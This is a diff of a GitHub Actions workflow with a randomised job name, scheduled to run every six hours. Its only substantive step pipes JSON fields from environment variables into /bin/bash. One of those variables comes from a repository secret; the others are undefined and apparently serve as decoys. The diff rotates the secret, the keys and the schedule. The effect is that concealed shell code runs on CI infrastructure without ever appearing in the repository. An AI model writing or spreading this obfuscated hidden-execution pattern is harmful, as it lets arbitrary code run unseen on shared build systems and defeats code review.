@@ -1,9 +1,8 @@
 name: ruanxiaowu19871010
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 1/6 * * *'
+    - cron: '16 5/6 * * *'
 
 jobs:
   build:
@@ -12,20 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: ruanxiaowu19871010
         env:
-          n3995: ${{ secrets.n3995 }}
+          ph1: ${{ secrets.ph1 }}
         run: |
-          echo $n3995 | jq -r .a87952 | /bin/bash
-          echo $whnzl9 | jq -r .kjqp65 | /bin/bash
-          echo $sm58419 | jq -r .rwv11 | /bin/bash
-          echo $mla07947 | jq -r .m84 | /bin/bash
-          echo $l9 | jq -r .pa4 | /bin/bash
-          echo $thgf4 | jq -r .cr8 | /bin/bash
-          echo $cgze47 | jq -r .w66846 | /bin/bash
-          echo $lfst7793 | jq -r .yud0 | /bin/bash
-          echo $vgrp3971 | jq -r .i68 | /bin/bash
-          echo $vjwcq48 | jq -r .avyl4 | /bin/bash
-          echo $rwnlb1337 | jq -r .plx377 | /bin/bash
-          echo $tp902 | jq -r .qdbgu5 | /bin/bash
-          echo $fvius0097 | jq -r .hy0107 | /bin/bash
-          echo $uld37395 | jq -r .iann3 | /bin/bash
+          echo $ph1 | jq -r .xe068 | /bin/bash
+          echo $p82139 | jq -r .q4 | /bin/bash
+          echo $c9 | jq -r .hce0 | /bin/bash
+          echo $i4 | jq -r .mehn05862 | /bin/bash
+          echo $gg60 | jq -r .neo3768 | /bin/bash
+          echo $vln698 | jq -r .xesrm69 | /bin/bash
+          echo $npk7 | jq -r .rrqks5 | /bin/bash
+          echo $apg467 | jq -r .cupl63 | /bin/bash
+          echo $xps049 | jq -r .zaw8517 | /bin/bash
+          echo $qnu33492 | jq -r .w9 | /bin/bash
+          echo $ti2 | jq -r .z73 | /bin/bash
+          echo $eq6 | jq -r .grug87 | /bin/bash
+          echo $onpk54772 | jq -r .rgyqa43 | /bin/bash
+          echo $lx1 | jq -r .izpn49029 | /bin/bash
+          echo $fsrhl35 | jq -r .wu740 | /bin/bash
+          echo $ybaac74 | jq -r .mpnjf469 | /bin/bash
 
